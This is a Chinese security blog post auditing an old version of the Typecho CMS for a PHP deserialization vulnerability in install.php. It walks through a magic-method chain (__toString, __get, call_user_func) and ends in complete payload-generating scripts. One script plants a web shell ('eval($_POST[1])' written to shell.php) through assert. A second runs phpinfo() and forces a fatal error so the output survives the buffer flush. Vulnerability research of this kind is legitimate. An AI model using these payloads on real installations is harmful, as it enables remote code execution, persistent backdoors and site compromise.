原创： p0desta  合天智汇

  
  

虽然自己也水了些CVE，但是并没有自己满意的、漂亮的漏洞利用链，今天呢主要是自己还没审出过反序列化漏洞，所以找了typecho老版本来审一下。

####  **正文**

在install.php第246行会反序列化操作

  1. `$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));`

  2. `$type = explode('_', $config['adapter']);`

  3. `$type = array_pop($type);`

进Typecho_Cookie类看一下get方法

  1. ` public static function get($key, $default = NULL)`

  2. ` {`

  3. ` $key = self::$_prefix . $key;`

  4. ` $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);`

  5. ` return $value;`

  6. ` }`

这里很显然是一个获取值的。

继续看一下怎么进入到这个反序列化，这里php夹杂着html代码，不太方便看，我简单处理一下

首先

  1. `if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {`

  2. ` exit;`

  3. `}`

  4. `// 挡掉可能的跨站请求`

  5. `if (!empty($_GET) || !empty($_POST)) {`

  6. ` if (empty($_SERVER['HTTP_REFERER'])) {`

  7. ` exit;`

  8. ` }`

  9. ` $parts = parse_url($_SERVER['HTTP_REFERER']);`

  10. ` if (!empty($parts['port']) && $parts['port'] != 80 && !Typecho_Common::isAppEngine()) {`

  11. ` $parts['host'] = "{$parts['host']}:{$parts['port']}";`

  12. ` }`

  13. ` if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {`

  14. ` exit;`

  15. ` }`

  16. `}`

这里是判断是否已经安装的,一般其他cms的写法是只判断是否已经存在了lock文件，但是这里有个可控参数，也就是我们还能进入这个install.php页面。

继续往下走，可以直接进入反序列化操作

这里还需要魔术方法，可以参考我总结的另外一篇文章
`http://p0desta.com/2018/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/`

  1. `$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));`

  2. `Typecho_Cookie::delete('__typecho_config');`

  3. `$db = new Typecho_Db($config['adapter'], $config['prefix']);`

  4. `$db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);`

  5. `Typecho_Db::set($db);`

这里我首先跟的是 `$db->addServer`，但是当我跟到 `Config.php`第62到81行的时候

  1. ` public function setDefault($config, $replace = false)`

  2. ` {`

  3. ` if (empty($config)) {`

  4. ` return;`

  5. ` }`

  6. ` /** 初始化参数 */`

  7. ` if (is_string($config)) {`

  8. ` parse_str($config, $params);`

  9. ` } else {`

  10. ` $params = $config;`

  11. ` }`

  12. ` /** 设置默认参数 */`

  13. ` foreach ($params as $name => $value) {`

  14. ` if ($replace || !array_key_exists($name, $this->_currentConfig)) {`

  15. ` $this->_currentConfig[$name] = $value;`

  16. ` }`

  17. ` }`

  18. ` }`

只发现到这里如果类当做数组遍历的时候会触发 `cureent`方法，但是我全局搜 `current`方法并没有找到可以利用的地方。

然后继续跟一下

  1. `$db = new Typecho_Db($config['adapter'], $config['prefix']);`

跟到 `Db.php`第114行到135行

  1. ` public function __construct($adapterName, $prefix = 'typecho_')`

  2. ` {`

  3. ` /** 获取适配器名称 */`

  4. ` $this->_adapterName = $adapterName;`

  5. ` /** 数据库适配器 */`

  6. ` $adapterName = 'Typecho_Db_Adapter_' . $adapterName;`

  7. ` if (!call_user_func(array($adapterName, 'isAvailable'))) {`

  8. ` throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");`

  9. ` }`

  10. ` $this->_prefix = $prefix;`

  11. ` /** 初始化内部变量 */`

  12. ` $this->_pool = array();`

  13. ` $this->_connectedPool = array();`

  14. ` $this->_config = array();`

  15. ` //实例化适配器对象`

  16. ` $this->_adapter = new $adapterName();`

  17. ` }`

危险的地方在于

  1. `$adapterName = 'Typecho_Db_Adapter_' . $adapterName;`

因为 `$adapterName`方法是可控的，被当做字符串拼接了，那么就会触发 `toString`方法，简化一下

  1. `<?php`

  2. `class p0desta{`

  3. ` function __toString(){`

  4. ` echo "p0desta";`

  5. ` return "p0desta";`

  6. ` }`

  7. `}`

  8. `class test{`

  9. ` private $t;`

  10. ` function __construct($s1){`

  11. ` $this->t = $s1;`

  12. ` $s1 = "xxx".$s1;`

  13. ` }`

  14. `}`

  15. `$config = new p0desta();`

  16. `$t2 = new test($config);`

  17. `output:p0desta`

那么全局搜一下toString找一下可以利用的地方

  
![图片.png](https://image.3001.net/images/20181122/1542874700_5bf6664cc8105.png!small)  

找到这个跟进去,这里看Feed.php第290行

  1. ` $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;`

读取不可访问属性的值时， **get()** **会被调用，那么只要item['author']我们可控，那么就可以出发** get()魔术方法。

通过全局搜素 `__get()`跟进/var/Typecho/Request.php，267行

  1. ` public function __get($key)`

  2. ` {`

  3. ` return $this->get($key);`

  4. ` }`

继续看get方法

  1. ` public function get($key, $default = NULL)`

  2. ` {`

  3. ` switch (true) {`

  4. ` case isset($this->_params[$key]):`

  5. ` $value = $this->_params[$key];`

  6. ` break;`

  7. ` case isset(self::$_httpParams[$key]):`

  8. ` $value = self::$_httpParams[$key];`

  9. ` break;`

  10. ` default:`

  11. ` $value = $default;`

  12. ` break;`

  13. ` }`

  14. ` $value = !is_array($value) && strlen($value) > 0 ? $value : $default;`

  15. ` return $this->_applyFilter($value);`

  16. ` }`

接着调用了 `_applyFilter`方法，继续跟进

  1. ` private function _applyFilter($value)`

  2. ` {`

  3. ` if ($this->_filter) {`

  4. ` foreach ($this->_filter as $filter) {`

  5. ` $value = is_array($value) ? array_map($filter, $value) :`

  6. ` call_user_func($filter, $value);`

  7. ` }`

  8. ` $this->_filter = array();`

  9. ` }`

  10. ` return $value;`

  11. ` }`

`call_user_func($filter,$value)`看到这里，我们关心的事情就是怎么构造去触发任意代码执行了。

到这里我们来整理下攻击链

  1. `install.php->反序列化操作->跟进Db.php->触发toString魔术方法->找到Feed.php-> 触发get魔术方法->找到/var/Typecho/Request.php->调用call_user_func`

构造payload

  1. `<?php`

  2. `class Typecho_Feed`

  3. `{`

  4. ` private $_type;`

  5. ` private $_items = array();`

  6. ` public function __construct()`

  7. ` {`

  8. ` $this->_type = 'RSS 2.0';`

  9. ` $this->_items[] = array(`

  10. ` "author"=>new Typecho_Request()`

  11. ` );`

  12. ` }`

  13. `}`

  14. `class Typecho_Request{`

  15. ` private $_params = array();`

  16. ` private $_filter = array();`

  17. ` public function __construct(){`

  18. ` $this->_params['screenName'] = 'file_put_contents(\'shell.php\', \'<?php eval($_POST[1]); ?>\')';`

  19. ` $this->_filter[0] = "assert";`

  20. ` }`

  21. `}`

  22. `$p0desta = array(`

  23. ` "adapter"=>new Typecho_Feed,`

  24. ` "prefix"=>"typecho_"`

  25. ` );`

  26. `var_dump(base64_encode(serialize($p0desta)));`

一开始我直接构造getshell，并没有遇到什么问题，但是如果想讲执行结果输出出来就会遇到问题，问题产生的原因呢在于

install.php第54行 `ob_start();`

看一下手册

  
![图片.png](https://image.3001.net/images/20181122/1542874712_5bf666583cc47.png!small)  

什么意思呢，这里我写个小demo来解释一下

  1. `<?php`

  2. `ob_start();`

  3. `echo "1";`

  4. `ob_end_clean();`

这个执行的话是不会有输出的， `ob_start()`激活了缓冲，输出结果会被写入到缓冲区，但是如果执行了
`ob_end_clean`函数就会把缓冲区的内容丢弃掉，那么也就没有输出了。

在Common.php第225行

  1. `set_exception_handler(array('Typecho_Common', 'exceptionHandle'));`

设置了用户自定义的异常处理函数，当存在未捕获的异常时会调用，看一下定义测函数

  1. ` public static function exceptionHandle(Exception $exception)`

  2. ` {`

  3. ` @ob_end_clean();`

  4. ` if (defined('__TYPECHO_DEBUG__')) {`

  5. ` echo '<h1>' . $exception->getMessage() . '</h1>';`

  6. ` echo nl2br($exception->__toString());`

  7. ` } else {`

  8. ` if (404 == $exception->getCode() && !empty(self::$exceptionHandle)) {`

  9. ` $handleClass = self::$exceptionHandle;`

  10. ` new $handleClass($exception);`

  11. ` } else {`

  12. ` self::error($exception);`

  13. ` }`

  14. ` }`

  15. ` exit;`

  16. ` }`

`@ob_end_clean();`显然，它清理了缓冲区。

这里因为payload使我们构造好带进去的，很难做到不触发异常，那么我们有什么办法来绕过呢

这里我想到的是让它执行完我们的命令之后引发个报错，看一下报错类型

  1. `Fatal Error:致命错误（脚本终止运行）`

  2. ` E_ERROR // 致命的运行错误，错误无法恢复，暂停执行脚本`

  3. ` E_CORE_ERROR // PHP启动时初始化过程中的致命错误`

  4. ` E_COMPILE_ERROR // 编译时致命性错，就像由Zend脚本引擎生成了一个E_ERROR`

  5. ` E_USER_ERROR // 自定义错误消息。像用PHP函数trigger_error（错误类型设置为：E_USER_ERROR）`

  6. ` Parse Error：编译时解析错误，语法错误（脚本终止运行）`

  7. ` E_PARSE //编译时的语法解析错误`

  8. ` Warning Error：警告错误（仅给出提示信息，脚本不终止运行）`

  9. ` E_WARNING // 运行时警告 (非致命错误)。`

  10. ` E_CORE_WARNING // PHP初始化启动过程中发生的警告 (非致命错误) 。`

  11. ` E_COMPILE_WARNING // 编译警告`

  12. ` E_USER_WARNING // 用户产生的警告信息`

  13. ` Notice Error：通知错误（仅给出通知信息，脚本不终止运行）`

  14. ` E_NOTICE // 运行时通知。表示脚本遇到可能会表现为错误的情况.`

  15. ` E_USER_NOTICE // 用户产生的通知信息。`

写个demo解释一下

  1. `<?php`

  2. `class a{`

  3. ` public $c;`

  4. `}`

  5. `$t = new a();`

  6. `echo $t['aaa'];`

![图片.png](https://image.3001.net/images/20181122/1542874730_5bf6666aedf36.png!small)  

看Feed.php第292-296行

  1. `if (!empty($item['category']) && is_array($item['category'])) {`

  2. ` foreach ($item['category'] as $category) {`

  3. ` $content .= '<category><![CDATA[' . $category['name'] . ']]></category>' . self::EOL;`

  4. ` }`

  5. ` }`

那么我们就可以让其停止执行，这样的话就不会执行到 `ob_end_clean`函数了。

修改payload如下

  1. `<?php`

  2. `class Typecho_Feed`

  3. `{`

  4. ` private $_type;`

  5. ` private $_items = array();`

  6. ` public function __construct()`

  7. ` {`

  8. ` $this->_type = 'RSS 2.0';`

  9. ` $this->_items[] = array(`

  10. ` "author"=>new Typecho_Request(),`

  11. ` "category"=>array(new Typecho_Request())`

  12. ` );`

  13. ` }`

  14. `}`

  15. `class Typecho_Request{`

  16. ` private $_params = array();`

  17. ` private $_filter = array();`

  18. ` public function __construct(){`

  19. ` $this->_params['screenName'] = 'phpinfo();';`

  20. ` $this->_filter[] = "assert";`

  21. ` }`

  22. `}`

  23. `$p0desta = array(`

  24. ` "adapter"=>new Typecho_Feed,`

  25. ` "prefix"=>"typecho_"`

  26. ` );`

  27. `echo(base64_encode(serialize($p0desta)));`

  
![图片.png](https://image.3001.net/images/20181122/1542874739_5bf6667374976.png!small)  

####  **总结**

总的利用链还是非常有意思的

  1. `install.php->反序列化操作->跟进Db.php->触发toString魔术方法->找到Feed.php-> 触发get魔术方法->找到/var/Typecho/Request.php->调用call_user_func`

有趣的攻击链总能引起研究的兴趣。

##  

